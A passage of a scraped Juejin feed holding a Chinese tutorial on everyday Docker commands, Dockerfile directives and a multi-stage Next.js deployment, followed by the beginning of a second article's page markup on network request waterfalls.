content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端也必看的Docker 核心命令与实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1341831509187863/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    timeweaver
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T03:36:25.000Z" title="Tue Jan 06 2026 03:36:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h2 data-id="heading-0">🚀 2026 开发者必看：</h2>
<h3 data-id="heading-1">一、 Docker 核心命令百科全书</h3>
<h4 data-id="heading-2">1. 镜像管理 (Images) — 你的程序</h4>



































<table><thead><tr><th><strong>命令</strong></th><th><strong>示例</strong></th><th><strong>核心用途</strong></th></tr></thead><tbody><tr><td><strong>构建</strong></td><td><code>docker build -t app:v1 .</code></td><td>根据 Dockerfile 创建镜像</td></tr><tr><td><strong>查看</strong></td><td><code>docker images</code></td><td>列出本地所有镜像</td></tr><tr><td><strong>删除</strong></td><td><code>docker rmi [ID/Name]</code></td><td>删除本地镜像</td></tr><tr><td><strong>导出</strong></td><td><code>docker save -o app.tar app:v1</code></td><td>镜像打包成文件（跨服务器传输）</td></tr><tr><td><strong>导入</strong></td><td><code>docker load -i app.tar</code></td><td>从文件恢复镜像</td></tr></tbody></table>
<h4 data-id="heading-3">2. 容器生命周期 (Containers) — 程序的运行实例</h4>


















































<table><thead><tr><th><strong>命令</strong></th><th><strong>示例</strong></th><th><strong>核心用途</strong></th></tr></thead><tbody><tr><td><strong>创建启动</strong></td><td><code>docker run -d -p 80:80 --name web nginx</code></td><td><strong>最常用</strong>：创建并后台启动容器</td></tr><tr><td><strong>启动</strong></td><td><code>docker start web</code></td><td>启动容器</td></tr><tr><td><strong>停止</strong></td><td><code>docker stop web</code></td><td>停止容器运行</td></tr><tr><td><strong>重启</strong></td><td><code>docker restart web</code></td><td>重启容器</td></tr><tr><td><strong>查看状态</strong></td><td><code>docker ps</code></td><td>查看所有容器（只包含启动的）</td></tr><tr><td><strong>查看状态</strong></td><td><code>docker ps -a</code></td><td>查看所有容器（含已停止）</td></tr><tr><td><strong>进入容器</strong></td><td><code>docker exec -it web sh</code></td><td><strong>调试必备</strong>：进入容器内部交互</td></tr><tr><td><strong>删除</strong></td><td><code>docker rm -f web</code></td><td>强制删除运行中的容器</td></tr></tbody></table>
<h4 data-id="heading-4">3. 运维与性能监控 — 线上“救火”神器</h4>



































<table><thead><tr><th><strong>命令</strong></th><th><strong>示例</strong></th><th><strong>核心用途</strong></th></tr></thead><tbody><tr><td><strong>日志查看</strong></td><td><code>docker logs -f --tail 100 web</code></td><td>实时查看最后 100 行日志</td></tr><tr><td><strong>性能监控</strong></td><td><code>docker stats</code></td><td>实时监控 CPU、内存、网络 IO</td></tr><tr><td><strong>元数据</strong></td><td><code>docker inspect web</code></td><td>查看容器 IP、挂载卷等原始 JSON 信息</td></tr><tr><td><strong>进程查看</strong></td><td><code>docker top web</code></td><td>查看容器内运行的具体进程</td></tr><tr><td><strong>文件传输</strong></td><td><code>docker cp ./a.txt web:/app/</code></td><td>宿主机与容器间文件互传</td></tr></tbody></table>
<h4 data-id="heading-5">4. 镜像发布与版本管理 (Distribution)</h4>

























<table><thead><tr><th><strong>命令</strong></th><th><strong>示例</strong></th><th><strong>核心用途</strong></th></tr></thead><tbody><tr><td><strong>打标签</strong></td><td><code>docker tag app:v1 registry.com/my-repo/app:v1</code></td><td><strong>必经之路</strong>：关联远程仓库地址</td></tr><tr><td><strong>仓库登录</strong></td><td><code>docker login registry.com</code></td><td>验证私有仓库权限</td></tr><tr><td><strong>镜像推送</strong></td><td><code>docker push registry.com/my-repo/app:v1</code></td><td>上传镜像至云端</td></tr></tbody></table>
<h4 data-id="heading-6">5. 系统清理 — 磁盘空间回收</h4>
<ul>
<li><strong>清理停止的容器</strong>：<code>docker container prune</code></li>
<li><strong>清理无用的镜像</strong>：<code>docker image prune -a</code></li>
<li><strong>一键全系统清理</strong>：<code>docker system prune -a --volumes</code> (慎用，会清理数据卷)</li>
</ul>
<hr/>
<h3 data-id="heading-7">二、 Dockerfile 常用指令深剖</h3>













































<table><thead><tr><th><strong>指令</strong></th><th><strong>作用</strong></th><th><strong>生产级建议</strong></th></tr></thead><tbody><tr><td><strong>FROM</strong></td><td>指定基础镜像</td><td>建议使用 <code>node:18-alpine</code>，体积比普通版小 80%</td></tr><tr><td><strong>WORKDIR</strong></td><td>设置工作目录</td><td>相当于容器内的 <code>cd</code>，不存在会自动创建</td></tr><tr><td><strong>COPY</strong></td><td>拷贝本地文件</td><td>优先拷贝依赖定义文件（如 package.json）以利用缓存</td></tr><tr><td><strong>RUN</strong></td><td>执行构建命令</td><td>多个命令用 <code>&amp;&amp;</code> 连接，减少镜像层数（Layer）</td></tr><tr><td><strong>ENV</strong></td><td>设置环境变量</td><td><strong>运行时有效</strong>：程序可通过环境变量动态调整行为</td></tr><tr><td><strong>EXPOSE</strong></td><td>声明端口</td><td>仅做文档说明，告知该应用预计监听的端口</td></tr><tr><td><strong>VOLUME</strong></td><td>定义匿名卷</td><td>标记数据持久化目录，防止容器删除后数据丢失</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-8">三、 Docker 难点辨析：CMD vs ENTRYPOINT</h3>
<p>这是面试中最常被问到的区别：</p>
<ul>
<li>
<p><strong>CMD</strong>：容器启动时的默认命令。它会被 <code>docker run</code> 后的参数<strong>完全替换</strong>。</p>
</li>
<li>
<p><strong>ENTRYPOINT</strong>：容器启动的入口。它<strong>不容易被覆盖</strong>，其后的内容会被当作参数传递给入口程序。</p>
</li>
<li>
<p><strong>黄金实践</strong>：<code>ENTRYPOINT ["node"]</code> + <code>CMD ["server.js"]</code>。</p>
<ul>
<li>直接运行：执行 <code>node server.js</code></li>
<li>传入参数运行：<code>docker run app app.js</code> 会执行 <code>node app.js</code>（保持了环境固定，灵活切换文件）。</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-9">四、 生产实战：Next.js 项目极致优化部署</h3>
<p>使用<strong>多阶段构建 (Multi-stage builds)</strong> 实现镜像瘦身。</p>
<p>Dockerfile</p>
<pre><code class="hljs language-vbnet" lang="vbnet"># 阶段 <span class="hljs-number">1</span>: 安装依赖
<span class="hljs-keyword">FROM</span> node:<span class="hljs-number">18</span>-alpine <span class="hljs-keyword">AS</span> deps
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci

# 阶段 <span class="hljs-number">2</span>: 编译构建
<span class="hljs-keyword">FROM</span> node:<span class="hljs-number">18</span>-alpine <span class="hljs-keyword">AS</span> builder
WORKDIR /app
COPY --<span class="hljs-keyword">from</span>=deps /app/node_modules ./node_modules
COPY . .
RUN npm run build

# 阶段 <span class="hljs-number">3</span>: 最终运行 (Runner)
<span class="hljs-keyword">FROM</span> node:<span class="hljs-number">18</span>-alpine <span class="hljs-keyword">AS</span> runner
WORKDIR /app
ENV NODE_ENV production
ENV PORT <span class="hljs-number">3000</span>

# 仅拷贝运行必需的 standalone 产物，不拷贝源码
COPY --<span class="hljs-keyword">from</span>=builder /app/<span class="hljs-keyword">public</span> ./<span class="hljs-keyword">public</span>
COPY --<span class="hljs-keyword">from</span>=builder /app/.<span class="hljs-keyword">next</span>/standalone ./
COPY --<span class="hljs-keyword">from</span>=builder /app/.<span class="hljs-keyword">next</span>/<span class="hljs-keyword">static</span> ./.<span class="hljs-keyword">next</span>/<span class="hljs-keyword">static</span>

EXPOSE <span class="hljs-number">3000</span>
CMD [<span class="hljs-string">"node"</span>, <span class="hljs-string">"server.js"</span>]
</code></pre>
<hr/>
<h3 data-id="heading-10">五、 避坑点与小贴士 (Tips)</h3>
<ol>
<li>
<p>必须要有的 .dockerignore：</p>
<p>在根目录创建该文件，排除 node_modules、.git、.next。如果不写，你的构建上下文会非常巨大，导致构建极慢。</p>
</li>
<li>
<p>端口映射的逻辑：</p>
<p>-p 8080:3000 意味着 宿主机(8080) : 容器内(3000)。</p>
</li>
<li>
<p>不要在镜像里存数据：</p>
<p>容器是易失的。数据库文件、用户上传的图片务必通过 -v 挂载到宿主机或使用云存储。</p>
</li>
<li>
<p>最小权限原则：</p>
<p>如果可能，尽量在 Dockerfile 中使用 USER node 切换非 root 用户运行，增加安全性。</p>
</li>
<li>
<p>时区问题：</p>
<p>默认镜像是 UTC 时间，通过 ENV TZ=Asia/Shanghai 修正。</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-11">六、 最常用的一套开发流程</h3>
<ol>
<li><strong>本地开发</strong>：通过 <code>docker-compose</code> 搭建本地环境。</li>
<li><strong>编写构建</strong>：编写 <code>Dockerfile</code>，执行 <code>docker build -t app:v1 .</code>。</li>
<li><strong>打标分发</strong>：<code>docker tag app:v1 registry.com/app:v1</code> -&gt; <code>docker push</code>。</li>
<li><strong>线上部署</strong>：在服务器执行 <code>docker pull</code> -&gt; <code>docker run</code>。</li>
<li><strong>日常监控</strong>：<code>docker stats</code> 观察性能，<code>docker logs</code> 查看异常。</li>
</ol>
<hr/>
<p><strong>如果你觉得这份全攻略对你有帮助，欢迎点赞、收藏并在评论区交流你的 Docker 使用心得！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[网络请求瀑布效应]]></title>    <link>https://juejin.cn/post/7591786340322033698</link>    <guid>https://juejin.cn/post/7591786340322033698</guid>    <pubDate>2026-01-06T05:17:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591786340322033698" data-draft-id="7591836822154772480" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="网络请求瀑布效应"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-06T05:17:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="夏天的风抚过耳膜"/> <meta itemprop="url" content="https://juejin.cn/user/1319870834942269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            网络请求瀑布效应
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1319870834942269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    夏天的风抚过耳膜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T05:17:55.000Z" title="Tue Jan 06 2026 05:17:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table 